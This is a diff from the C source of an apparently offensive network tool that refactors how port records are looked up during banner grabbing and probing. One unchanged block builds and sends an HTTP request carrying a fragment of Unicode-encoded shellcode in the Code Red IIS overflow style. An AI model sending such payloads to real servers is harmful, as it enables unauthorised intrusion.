@@ -18,9 +18,9 @@ int any(int type){
 	unsigned char *serverResp=NULL;
 	switch(type){
 	case ANY_BANNER_GRABBING:
-		printf("  Probable OS (TTL Fingerprinting): %s%s%s\n\n", C_HWHITE, target.portsToScan[get_port_index(portUnderHacking)].operatingSystem, C_DEFAULT);
-		printf("  Probable Service (IANA spec): %s%s%s\n\n", C_HWHITE,target.portsToScan[get_port_index(portUnderHacking)].serviceName, C_DEFAULT);
-		switch(target.portsToScan[get_port_index(portUnderHacking)].connectionType){
+		printf("  Probable OS (TTL Fingerprinting): %s%s%s\n\n", C_HWHITE, target.ports[portUnderHacking].operatingSystem, C_DEFAULT);
+		printf("  Probable Service (IANA spec): %s%s%s\n\n", C_HWHITE,target.ports[portUnderHacking].serviceName, C_DEFAULT);
+		switch(target.ports[portUnderHacking].connectionType){
 		case SOCKET_CONN_TYPE:
 			printf("  Connection supported: %sSocket%s\n\n", C_HWHITE, C_DEFAULT);
 			break;
@@ -44,7 +44,7 @@ int any(int type){
 			int sk=0;
 			ssize_t c=format_strings_from_files(queries[i], msg);
 			int bytesRecv=send_msg_to_server(&sk,target.targetIp, NULL, portUnderHacking,
-					target.portsToScan[get_port_index(portUnderHacking)].connectionType,
+					target.ports[portUnderHacking].connectionType,
 					msg,c,&serverResp,BUFFER_SIZE_128K,0);
 			if(bytesRecv<=0){
 				free(serverResp);
@@ -137,7 +137,7 @@ int any(int type){
 					"1%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078"
 					"%u0000%u00=a HTTP/1.0",'\r','\n','\r','\n');
 			int sk=0;
-			int bytesRecv=send_msg_to_server(&sk,target.targetIp,NULL, portUnderHacking, target.portsToScan[get_port_index(portUnderHacking)].connectionType
+			int bytesRecv=send_msg_to_server(&sk,target.targetIp,NULL, portUnderHacking, target.ports[portUnderHacking].connectionType
 					,msg, strlen(msg),&serverResp,BUFFER_SIZE_128K,0);
 			close(sk);
 			if(bytesRecv==RETURN_ERROR) show_message("Error creating socket. Maybe the port is blocked. Wait, and try again in a while.",0,0, ERROR_MESSAGE,1);
